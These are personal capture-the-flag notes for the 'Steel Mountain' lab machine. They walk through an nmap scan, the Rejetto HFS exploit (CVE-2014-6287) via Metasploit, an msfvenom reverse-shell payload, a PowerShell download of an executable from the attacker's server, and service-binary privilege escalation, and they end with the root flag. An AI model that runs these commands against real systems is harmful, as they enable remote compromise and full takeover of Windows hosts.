# Steel Mountain Notes

# My Machine IP 

>	10.8.19.163

#Steel Mountain Target IP

>	10.10.69.38

# NMAP 
---
>	nmap -A -sC -sV -Pn -n --script vuln -T5 10.10.138.155 | tee steel.nmap

>	Open Ports Scan Results:
>	
>	80/tcp    open  http               Microsoft IIS httpd 8.5
>	135/tcp   open  msrpc              Microsoft Windows RPC
>	139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
>	445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
>	3389/tcp  open  ssl/ms-wbt-server?
>	8080/tcp  open  http               HttpFileServer httpd 2.3
>	49152/tcp open  msrpc              Microsoft Windows RPC
>	49153/tcp open  msrpc              Microsoft Windows RPC
>	49154/tcp open  msrpc              Microsoft Windows RPC
>	49155/tcp open  msrpc              Microsoft Windows RPC
>	49157/tcp open  msrpc              Microsoft Windows RPC
>	49163/tcp open  msrpc              Microsoft Windows RPC
___

# What File Server is running on the machine?

	Searched exploit.db for a http file server exploit. NMAP scans do not show it as a rejetto file server but correct answer is 
	> rjetto http file server

# CVE discovered

	> CVE-2014-6287

	Utilized Metasploit and discovered I can connect with a meterpreter shell.

	Metasploit commands:

	> getuid - STEELMOUNTAIN\bill 

 Uploaded a msfvenom package with: 

 Created another meterpreter listening sessions and executed the malware in c:\windows\temp

> msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.19.163 LPORT=6666 -f exe -o shell.exe

> powershell Invoke-WebRequest -Uri http://10.8.19.163:8000/Advanced.exe -Outfile Advanced.exe
 
 > start shell.exe

More stable meterpreter session created. Searchef for all .txt files with:

> search -f *.txt

Try to upgrade account with powersploit.

Uploaded PowerUp.ps1 from powersploit in directory c:\Users\bill\desktop

> . .\PowerUp.ps1

> Invoke-AllChecks

Powerup shows that "AdvancedSystemCareService9" has restart authority. Lets check that out.

Drop into a windows "shell" form Meterpreter. Stop service:

> sc stop AdvancedSystemCareService9

Then I reupload "Advanced.exe" to overwrite the exisiting root level service.

Then I restart the Advanced System Care service with:

sc start AdvancedSystemCareService9

My windows shell comes online.

> whoami "nt authority\system"

> c:\Users\Administrator\Desktop>more root.txt
>	more root.txt
>	9af5f314f57607c00fd09803a587db80





___
